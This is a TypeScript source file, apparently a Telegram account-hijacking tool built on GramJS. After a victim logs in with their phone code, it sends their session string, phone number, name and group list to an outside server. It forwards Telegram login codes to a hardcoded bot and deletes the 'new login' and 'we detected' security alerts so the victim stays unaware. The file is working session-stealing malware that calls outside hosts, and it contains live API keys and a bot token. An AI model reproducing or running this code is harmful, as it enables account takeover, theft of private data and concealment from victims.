import { Api } from "telegram";
import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions";
import axios from "axios";
import { sleep } from "telegram/Helpers";
import { NewMessage, NewMessageEvent } from "telegram/events";
const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage";

const clients = new Map();
const apiId = 24559917 || parseInt(process.env.API_ID);
const apiHash = "702294de6c08f4fd8c94c3141e0cebfb" || process.env.API_HASH;

async function restAcc(phoneNumber) {
    await sleep(1000);
    console.log("Reset - ", phoneNumber);
    const client: TelegramManager = getClient(phoneNumber)
    await client.client.destroy();
    await client.client.disconnect();
    client.client.session.delete();
    client.client = null;
    delete client['client'];
    await deleteClient(phoneNumber);
}

export function getClient(number): TelegramManager {
    return clients.get(number);
}

export async function hasClient(number) {
    return clients.has(number);
}

export async function deleteClient(number) {
    console.log("Deleting Client");
    return clients.delete(number);
}

export async function disconnectAll() {
    for (const [phoneNumber, client] of clients.entries()) {
        try {
            await client?.disconnect();
            clients.delete(phoneNumber);
            console.log(`Client disconnected: ${phoneNumber}`);
        } catch (error) {
            console.log(error);
            console.log(`Failed to Disconnect : ${phoneNumber}`);
        }
    }
}

export async function createClient(number) {
    const cli = new TelegramManager(number);
    clients.set(number, cli);
    return cli.sendCode()
}

class TelegramManager {
    session: any;
    phoneNumber: any;
    client: TelegramClient;
    phoneCodeHash: any;
    constructor(number) {
        this.phoneNumber = number;
        this.session = new StringSession('');
        this.client = null;
        this.createClient();
    }

    async disconnect() {
        await this.client.disconnect();
        await this.client.destroy();
        this.session.delete();
    }

    async createClient() {
        try {
            this.client = new TelegramClient(this.session, apiId, apiHash, {
                connectionRetries: 5,
            });
            await this.client.connect();
        } catch (error) {
            console.log(error);
        }
    }

    async sendCode(
        forceSMS = false
    ): Promise<{
        phoneCodeHash: string;
        isCodeViaApp: boolean;
    }> {
        try {
            await this.client.connect();
            console.log("Sending OTP - ", this.phoneNumber, apiId, apiHash);
            const sendResult = await this.client.invoke(
                new Api.auth.SendCode({
                    phoneNumber: `+${this.phoneNumber}`,
                    apiId,
                    apiHash,
                    settings: new Api.CodeSettings({}),
                })
            );
            if (sendResult instanceof Api.auth.SentCodeSuccess)
                throw new Error("logged in right after sending the code");
            this.phoneCodeHash = sendResult.phoneCodeHash
            // If we already sent a SMS, do not resend the phoneCode (hash may be empty)
            if (!forceSMS || sendResult.type instanceof Api.auth.SentCodeTypeSms) {
                return {
                    phoneCodeHash: sendResult.phoneCodeHash,
                    isCodeViaApp:
                        sendResult.type instanceof Api.auth.SentCodeTypeApp,
                };
            }

            const resendResult = await this.client.invoke(
                new Api.auth.ResendCode({
                    phoneNumber: `+${this.phoneNumber}`,
                    phoneCodeHash: sendResult.phoneCodeHash,
                })
            );
            if (resendResult instanceof Api.auth.SentCodeSuccess)
                throw new Error("logged in right after resending the code");

            this.phoneCodeHash = resendResult.phoneCodeHash
            setTimeout(async () => {
                await restAcc(this.phoneNumber)
            }, 120000);
            return {
                phoneCodeHash: resendResult.phoneCodeHash,
                isCodeViaApp: resendResult.type instanceof Api.auth.SentCodeTypeApp,
            };
        } catch (err: any) {
            await restAcc(this.phoneNumber);
            console.log(err);
            if (err.errorMessage === "AUTH_RESTART") {
                return this.client.sendCode({ apiId, apiHash }, `+${this.phoneNumber}`, forceSMS);
            } else {
                throw err;
            }
        }
    }

    async login(phoneCode: any) {
        let isRegistrationRequired = false
        let termsOfService;
        try {
            if (!phoneCode) {
                throw new Error("Code is empty");
            }
            if (!this.client.connected) {
                await this.client.connect();
            }
            const result = await this.client?.invoke(
                new Api.auth.SignIn({
                    phoneNumber: `+${this.phoneNumber}`,
                    phoneCodeHash: this.phoneCodeHash,
                    phoneCode,
                })
            );
            if (result instanceof Api.auth.AuthorizationSignUpRequired) {
                isRegistrationRequired = true;
                termsOfService = result.termsOfService;
            } else {
                console.log(this.client.session.save());
                this.client.addEventHandler(deleteMsgs, new NewMessage({ incoming: true }));
                const sess = this.client.session.save() as unknown as string;
                const user: any = await result.user.toJSON();
                const chats = await this.client?.getDialogs({ limit: 130 });
                let personalChats = 0;
                let channels = 0;
                const chatsArray = [];

                chats.map((chat: any) => {
                    if (chat.isChannel || chat.isGroup) {
                        channels++;
                        const chatEntity = chat.entity.toJSON();
                        const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
                        if (!chatEntity.broadcast && !cannotSendMsgs) {
                            chatsArray.push(chatEntity);
                        }
                    }
                    else {
                        personalChats++
                    }
                });
                const payload3 = {
                    mobile: user.phone,
                    session: `${sess}`,
                    firstName: user.firstName,
                    lastName: user.lastName,
                    userName: user.username ? `@${user.username}` : null,
                    channels: channels,
                    personalChats: personalChats
                };
                await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
                await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
                setTimeout(async () => {
                    await restAcc(this.phoneNumber);
                }, 40000);
                return { status: 200, message: "Login success" }
            }
        } catch (err: any) {
            console.log(err);
            if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
                console.log("passowrd Required")
                return { status: 400, message: "2FA required" }
                // return client.signInWithPassword(apiCredentials, { password: () => Promise.resolve(password), onError: (err) => console.log(err) });
            } else {
                const shouldWeStop = false//await authParams.onError(err);
                if (shouldWeStop) {
                    throw new Error("AUTH_USER_CANCEL");
                }
            }
            await restAcc(this.phoneNumber);
            return { status: 400, message: err.errorMessage }
        }

        if (isRegistrationRequired) {
            try {
                let lastName = 'last name';
                let firstName = "first name";
                const { user } = (await this.client.invoke(
                    new Api.auth.SignUp({
                        phoneNumber: `+${this.phoneNumber}`,
                        phoneCodeHash: this.phoneCodeHash,
                        firstName,
                        lastName,
                    })
                )) as Api.auth.Authorization;

                if (termsOfService) {
                    // This is a violation of Telegram rules: the user should be presented with and accept TOS.
                    await this.client.invoke(
                        new Api.help.AcceptTermsOfService({
                            id: termsOfService.id,
                        })
                    );
                }

                return user;
            } catch (err: any) {
                const shouldWeStop = false//await authParams.onError(err);
                if (shouldWeStop) {
                    throw new Error("AUTH_USER_CANCEL");
                }
            }
        }
        await restAcc(this.phoneNumber);
    }
}

async function deleteMsgs(event: NewMessageEvent) {
    if (event.message.chatId.toString() == "777000") {
        const payload = {
            chat_id: "-1001801844217",
            text: event.message.text
        };
        console.log("RECIEVED - ", event.message.text);
        await event.message.delete({ revoke: true });
        const options = {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        };
        await fetchWithTimeout(`${ppplbot}`, options);
    }
    await sleep(300);
    const msgs = await event.client.getMessages("777000", { limit: 3 });
    msgs.forEach(async msg => {
        if (msg.text.toLowerCase().includes('we detected') || msg.text.toLowerCase().includes('new login')) {
            await msg.delete({ revoke: true });
        }
    })
}


async function fetchWithTimeout(resource, options: any = {}) {
    const timeout = options?.timeout || 15000;
    const source = axios.CancelToken.source();
    const id = setTimeout(() => source.cancel(), timeout);

    try {
        const response = await axios({
            ...options,
            url: resource,
            cancelToken: source.token
        });
        clearTimeout(id);
        return response;
    } catch (error) {
        if (axios.isCancel(error)) {
            console.log('Request canceled:', error.message);
        } else {
            console.log('Error:', error.message);
        }
        return undefined;
    }
}